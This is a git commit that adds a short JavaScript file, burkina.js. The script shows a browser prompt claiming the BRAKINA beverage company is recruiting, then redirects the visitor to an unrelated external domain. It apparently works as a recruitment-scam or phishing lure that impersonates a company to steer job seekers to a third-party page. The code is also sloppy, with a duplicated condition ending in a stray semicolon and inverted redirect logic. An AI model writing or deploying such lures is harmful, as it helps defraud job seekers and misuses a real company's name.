29bb30ed78b9c9f28beffbd264a4131a3c80bf56
newetijazz20 <newetijazz20@gmail.com>
2026-02-04 12:01:13 +0100

    Create burkina.js

---
+++ burkina.js
@@ -0,0 +1,6 @@
+var password = 'Recrutement pour le BRAKINA - Boisson Rafraîchissante du Burkina'
+password=prompt('AVIS : Le BRAKINA recrute actuellement, appuyez sur OK pour postuler au ','Recrutement pour le BRAKINA');
+if (password != 'Recrutement pour le BRAKINA');
+if (password != 'Recrutement pour le BRAKINA') {
+location.href='https://www.krhitid.site/BRAKINA-Recrutement';
+}
